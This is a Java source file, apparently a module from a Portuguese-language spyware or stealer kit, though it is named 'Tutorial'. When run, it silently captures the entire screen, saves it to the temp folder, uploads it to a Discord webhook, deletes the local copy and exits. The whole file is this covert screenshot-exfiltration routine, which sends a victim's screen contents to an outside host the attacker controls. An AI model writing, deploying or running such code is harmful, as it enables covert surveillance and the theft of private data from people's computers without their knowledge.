package Modules;

import java.awt.AWTException;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.DataOutputStream;
import java.io.File;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;
import javax.imageio.ImageIO;

public class Tutorial {
    public static void main(String[] args) {
        try {
            Robot robot = new Robot();
            Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
            BufferedImage screenshot = robot.createScreenCapture(screenRect);

            String tempFolderPath = System.getProperty("java.io.tmpdir");
            File outputfile = new File(tempFolderPath, "screenshot.png");
            ImageIO.write(screenshot, "png", outputfile);

            sendScreenshotToDiscordWebhook(outputfile);

            outputfile.delete();

            System.out.println("Screenshot da tela enviada para o Discord com sucesso!");

            closeApplication();
        } catch (AWTException | IOException e) {
            e.printStackTrace();
        }
    }

    private static void sendScreenshotToDiscordWebhook(File screenshotFile) throws IOException {
        String discordWebhookUrl = "YOUR WEBHOOK";

        URL url = new URL(discordWebhookUrl);
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        connection.setDoOutput(true);
        connection.setRequestMethod("POST");
        connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=---BOUNDARY");

        String boundary = "---BOUNDARY";
        String attachmentName = "screenshot.png";
        String attachmentFileName = screenshotFile.getName();
        String lineBreak = "\r\n";

        StringBuilder requestBodyBuilder = new StringBuilder();
        requestBodyBuilder.append("--").append(boundary).append(lineBreak);
        requestBodyBuilder.append("Content-Disposition: form-data; name=\"file\"; filename=\"").append(attachmentFileName).append("\"").append(lineBreak);
        requestBodyBuilder.append("Content-Type: image/png").append(lineBreak);
        requestBodyBuilder.append(lineBreak);

        String requestBody = requestBodyBuilder.toString();
        byte[] requestBodyBytes = requestBody.getBytes();
        byte[] lineBreakBytes = lineBreak.getBytes();
        byte[] fileBytes = java.nio.file.Files.readAllBytes(screenshotFile.toPath());

        DataOutputStream outputStream = new DataOutputStream(connection.getOutputStream());
        outputStream.write(requestBodyBytes);
        outputStream.write(fileBytes);
        outputStream.write(lineBreakBytes);
        outputStream.write(("--" + boundary + "--").getBytes());
        outputStream.flush();
        outputStream.close();

        int responseCode = connection.getResponseCode();
        connection.disconnect();
    }

    private static void closeApplication() {
        System.exit(0);
    }
}
